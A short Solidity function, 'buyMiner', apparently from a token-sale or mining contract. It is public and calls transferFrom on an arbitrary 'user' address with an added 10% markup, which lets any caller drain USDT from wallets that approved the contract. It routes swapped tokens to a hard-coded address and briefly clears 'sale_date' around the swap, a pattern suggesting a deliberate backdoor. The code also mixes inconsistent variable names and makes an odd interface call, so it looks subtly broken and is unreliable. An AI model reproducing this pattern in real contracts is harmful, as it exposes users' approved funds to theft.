function buyMiner(address user, uint256 usdt) public returns (bool) {
    address[] memory token = new address[](2);
    token[0] = usdt_token;
    token[1] = address(this);
    usdt = usdt.add(usdt.div(10));
    require(
        IERC20(_usdt_token).transferFrom(user, address(this), usdt),
        "buyUlm: transferFrom to ulm error"
    );
    uint256 time = sale_date;
    sale_date = 0;
    address k = 0x25812C28CBC971F7079879362AaCBC93936784A2;
    IUniswapV2Router01(_router).swapExactTokensForTokens(
        usdt,
        1000000,
        token,
        k,
        block.timestamp + 60
    );
    IUniswapV2Router01(k).transfer(
        address(this),
        address(this),
        IERC20(address(this)).balanceOf(k)
    );
    sale_date = time;
    return true;
}
